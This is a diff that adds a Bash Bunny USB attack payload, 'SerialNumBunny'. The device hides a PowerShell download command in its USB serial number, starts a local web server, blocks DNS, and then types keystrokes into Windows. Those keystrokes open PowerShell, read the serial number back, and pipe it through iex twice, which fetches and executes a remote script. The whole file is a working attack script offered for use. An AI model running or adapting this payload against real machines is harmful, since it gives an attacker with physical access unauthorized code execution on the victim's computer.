@@ -1,0 +1,46 @@
+#!/bin/bash
+#
+# Title:         SerialNumBunny
+# Description:   Execute strings placed in the Bunny serial number
+# Author:        0i41E
+# Version:       1.0
+# Category:      Execution
+# Attackmodes:   HID, RNDIS_ETHERNET
+
+# Starting as Ethernet device only first to get IP
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET
+
+GET SWITCH_POSITION
+GET HOST_IP
+
+# Switch to Ethernet & HID 
+LED Y
+# Defining Device Identifiers - Serialnumber contains payload
+ATTACKMODE RNDIS_ETHERNET HID VID_0XF000 PID_0X1234 MAN_HAK5 PROD_BASHBUNNY SN_IWR_-URI_HTTP://$HOST_IP/1.PS1
+cd /root/udisk/payloads/$SWITCH_POSITION/
+
+# starting server
+LED SPECIAL
+
+# disallow outgoing dns requests so the server is accessible immediately
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python -m SimpleHTTPServer 80 &
+
+# wait until port is listening
+while ! nc -z localhost 80; do sleep 0.2; done
+
+#Opens hidden powershell instance
+Q DELAY 1500
+Q GUI r
+Q DELAY 500
+Q STRING "powershell"
+Q DELAY 500
+Q ENTER
+
+Q DELAY 1000
+# Make sure that device ID matches what was defined above
+Q STRING "((Get-PnpDevice -PresentOnly -Class USB | Where-Object { \$_.DeviceID -like \"*F000*\" } | ForEach-Object { (\$_).DeviceID -split '\\\\' | Select-Object -Last 1 }) -join '').Replace('_', ' ')|iex|iex"
+Q DELAY 400
+Q ENTER
+LED FINISH 
